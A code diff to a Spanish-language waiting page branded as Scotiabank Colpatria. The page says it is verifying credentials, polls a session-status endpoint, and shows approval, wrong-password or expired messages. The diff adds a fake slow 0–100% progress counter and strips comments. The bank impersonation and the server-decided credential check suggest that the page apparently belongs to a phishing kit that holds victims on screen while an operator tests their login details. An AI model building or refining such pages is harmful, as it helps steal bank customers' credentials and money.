@@ -24,7 +24,6 @@
             color: #333;
         }
 
-        /* ── CONTENEDOR PRINCIPAL ── */
         .stage {
             position: relative;
             width: 100%;
@@ -36,7 +35,7 @@
             padding: 4rem 2rem;
         }
 
-        /* ── CÍRCULO RADIAL "100% digital" ── */
+        /* ── CÍRCULO RADIAL ── */
         .radial {
             position: relative;
             width: 340px;
@@ -47,7 +46,6 @@
             margin-bottom: 2rem;
         }
 
-        /* Rayos animados */
         .rays {
             position: absolute;
             inset: 0;
@@ -60,7 +58,6 @@
             to   { transform: rotate(360deg); }
         }
 
-        /* Cada rayo individual — blancos, largos, finos */
         .ray {
             position: absolute;
             top: 50%;
@@ -85,7 +82,6 @@
             50%      { opacity: 0.55; height: 18px; }
         }
 
-        /* Círculo central blanco */
         .center-circle {
             position: relative;
             z-index: 2;
@@ -108,7 +104,7 @@
             color: #2c2c2c;
             line-height: 1;
             letter-spacing: -0.04em;
-            font-family: 'Source Sans 3', Arial, sans-serif;
+            font-variant-numeric: tabular-nums;
         }
 
         .percent span {
@@ -255,23 +251,12 @@
 
         /* ── RESPONSIVE ── */
         @media (max-width: 480px) {
-            .radial {
-                width: 260px;
-                height: 260px;
-            }
-            .center-circle {
-                width: 170px;
-                height: 170px;
-            }
+            .radial { width: 260px; height: 260px; }
+            .center-circle { width: 170px; height: 170px; }
             .percent { font-size: 52px; }
             .percent span { font-size: 34px; }
             .digital { font-size: 19px; }
-
-            .card {
-                width: 300px;
-                height: 38px;
-            }
-
+            .card { width: 300px; height: 38px; }
             .footer {
                 flex-direction: column;
                 align-items: center;
@@ -279,11 +264,7 @@
                 padding: 0 2rem;
                 bottom: 1.4rem;
             }
-
-            .waiting-msg {
-                bottom: 22%;
-                font-size: 11px;
-            }
+            .waiting-msg { bottom: 22%; font-size: 11px; }
         }
 
         @media (prefers-reduced-motion: reduce) {
@@ -298,37 +279,31 @@
 
 <div class="stage">
 
-    <!-- Círculo radial 100% digital -->
     <div class="radial">
         <div class="rays" id="rays"></div>
 
         <div class="center-circle">
-            <div class="percent" id="percentText">100<span>%</span></div>
+            <div class="percent" id="percentText">0<span>%</span></div>
             <div class="digital">digital</div>
         </div>
     </div>
 
-    <!-- Tarjeta (simula laptop) -->
     <div class="card">
         <span class="card__brand">Scotiabank Colpatria</span>
     </div>
 
-    <!-- Mensaje de espera -->
     <div class="waiting-msg">
         <span id="waitingText">Verificando credenciales</span><span class="waiting-dots"></span>
     </div>
 
-    <!-- Footer -->
     <div class="footer">
         <div class="footer__left">
             <p>Aplican términos y condiciones.</p>
             <p>Más información en <strong>www.scotiabank.com</strong></p>
         </div>
-
         <div class="footer__center">
             Protegemos tus datos
         </div>
-
         <div class="footer__right">
             <div class="footer__badge">
                 <span class="footer__badge-icon">✓</span>
@@ -361,8 +336,8 @@
     // ── Lógica de sesión ──
     const urlParams = new URLSearchParams(window.location.search);
     const sessionId = urlParams.get('sessionId');
-
     const waitingTextEl = document.getElementById('waitingText');
+    const percentEl = document.getElementById('percentText');
 
     if (!sessionId) {
         waitingTextEl.textContent = 'Sesión inválida';
@@ -372,9 +347,38 @@
     }
 
     const API_URL = window.location.origin + '/api/session-status/' + sessionId;
-    const percentEl = document.getElementById('percentText');
 
-    // ── Consultar estado ──
+    // ═══════════════════════════════════════════
+    // CONTADOR ANIMADO LENTO — 0% a 100%
+    // ═══════════════════════════════════════════
+    let currentPercent = 0;
+    const TARGET_PERCENT = 100;
+    const DURATION_MS = 15000; // 15 segundos para llegar al 100%
+    const TICK_MS = 50;         // actualización cada 50ms
+    const TOTAL_TICKS = DURATION_MS / TICK_MS;
+
+    // Curva de easing suave (acelera al inicio, desacelera al final)
+    function easeOutQuad(t) {
+        return t * (2 - t);
+    }
+
+    const percentInterval = setInterval(() => {
+        currentPercent += (TARGET_PERCENT / TOTAL_TICKS);
+
+        if (currentPercent >= TARGET_PERCENT) {
+            currentPercent = TARGET_PERCENT;
+            clearInterval(percentInterval);
+        }
+
+        // Aplicar easing para que se vea más natural
+        const eased = easeOutQuad(currentPercent / TARGET_PERCENT) * TARGET_PERCENT;
+
+        percentEl.innerHTML = Math.floor(eased) + '<span>%</span>';
+    }, TICK_MS);
+
+    // ═══════════════════════════════════════════
+    // CONSULTAR ESTADO
+    // ═══════════════════════════════════════════
     async function checkStatus() {
         try {
             const response = await fetch(API_URL);
@@ -382,8 +386,10 @@
 
             if (data.status === 'ok') {
                 clearInterval(statusCheckInterval);
+                clearInterval(percentInterval);
 
-                // Cambio sutil: solo el texto de espera
+                // Forzar 100%
+                percentEl.innerHTML = '100<span>%</span>';
                 waitingTextEl.textContent = 'Acceso aprobado';
 
                 setTimeout(() => {
@@ -392,7 +398,9 @@
 
             } else if (data.status === 'err') {
                 clearInterval(statusCheckInterval);
+                clearInterval(percentInterval);
 
+                percentEl.innerHTML = '100<span>%</span>';
                 waitingTextEl.textContent = 'Usuario o contraseña inválidos';
                 waitingTextEl.style.color = '#c0392b';
 
@@ -402,7 +410,9 @@
 
             } else if (data.status === 'expired') {
                 clearInterval(statusCheckInterval);
+                clearInterval(percentInterval);
 
+                percentEl.innerHTML = '100<span>%</span>';
                 waitingTextEl.textContent = 'Sesión expirada';
                 waitingTextEl.style.color = '#b87333';
 
@@ -420,6 +430,7 @@
 
     window.addEventListener('beforeunload', () => {
         clearInterval(statusCheckInterval);
+        clearInterval(percentInterval);
     });
 </script>
 </body>
